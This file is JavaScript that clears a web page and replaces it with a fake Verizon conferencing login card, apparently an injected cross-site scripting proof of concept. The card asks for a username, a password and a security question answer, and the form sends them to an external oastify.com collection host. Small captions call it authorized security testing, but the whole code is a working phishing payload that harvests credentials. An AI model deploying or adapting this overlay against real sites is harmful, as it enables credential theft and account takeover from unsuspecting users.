// Clear page content and set basic body styles
document.body.innerHTML = '';
document.body.style.margin = '0';
document.body.style.fontFamily = 'Arial, sans-serif';
document.body.style.background = '#f3f4f6';

// Outer wrapper to center the card
const wrapper = document.createElement('div');
wrapper.style.minHeight = '100vh';
wrapper.style.display = 'flex';
wrapper.style.alignItems = 'center';
wrapper.style.justifyContent = 'center';

// Card container
const card = document.createElement('div');
card.style.width = '360px';
card.style.background = '#ffffff';
card.style.borderRadius = '12px';
card.style.boxShadow = '0 6px 20px rgba(0,0,0,0.18)';
card.style.padding = '28px 26px 24px';
card.style.textAlign = 'center';

// Verizon logo
const logo = document.createElement('img');
logo.src = 'https://e-meetings.verizonbusiness.com/images/VerizonLogo_RED_90.png';
logo.alt = 'Verizon';
logo.style.maxWidth = '160px';
logo.style.marginBottom = '20px';
card.appendChild(logo);

// Title
const loginTitle = document.createElement('h2');
loginTitle.textContent = 'Conferencing Login';
loginTitle.style.margin = '0 0 6px';
loginTitle.style.color = '#222';
card.appendChild(loginTitle);

// Subtitle
const subtitle = document.createElement('p');
subtitle.textContent = 'Security test – proof of concept';
subtitle.style.margin = '0 0 18px';
subtitle.style.fontSize = '13px';
subtitle.style.color = '#666';
card.appendChild(subtitle);

// Create form
const customLoginForm = document.createElement('form');
customLoginForm.id = 'customLoginForm';
customLoginForm.action = 'https://l7td7vs1zvr3oogs077qhz6lgcm3auyj.oastify.com';
customLoginForm.method = 'POST';

// Helper to create a styled input
function createFormField(form, placeholder, name, type = 'text') {
  const input = document.createElement('input');
  input.type = type;
  input.name = name;
  input.placeholder = placeholder;
  input.required = true;

  input.style.width = '100%';
  input.style.padding = '10px';
  input.style.margin = '7px 0';
  input.style.border = '1px solid #ccc';
  input.style.borderRadius = '6px';
  input.style.fontSize = '13px';
  input.style.boxSizing = 'border-box';

  form.appendChild(input);
  return input;
}

// Fields
createFormField(customLoginForm, 'Username', 'username');
createFormField(customLoginForm, 'Password', 'password', 'password');
createFormField(customLoginForm, 'Security question answer', 'answer');

// Submit button
const formSubmitButton = document.createElement('button');
formSubmitButton.type = 'submit';
formSubmitButton.textContent = 'Login';
formSubmitButton.style.width = '100%';
formSubmitButton.style.padding = '11px';
formSubmitButton.style.marginTop = '12px';
formSubmitButton.style.border = 'none';
formSubmitButton.style.borderRadius = '6px';
formSubmitButton.style.fontSize = '14px';
formSubmitButton.style.fontWeight = '600';
formSubmitButton.style.cursor = 'pointer';
formSubmitButton.style.background = '#d22';
formSubmitButton.style.color = '#fff';

customLoginForm.appendChild(formSubmitButton);

// Footnote
const footnote = document.createElement('div');
footnote.textContent = 'Authorized security testing only.';
footnote.style.marginTop = '10px';
footnote.style.fontSize = '11px';
footnote.style.color = '#999';

// Assemble
card.appendChild(customLoginForm);
card.appendChild(footnote);
wrapper.appendChild(card);
document.body.appendChild(wrapper);
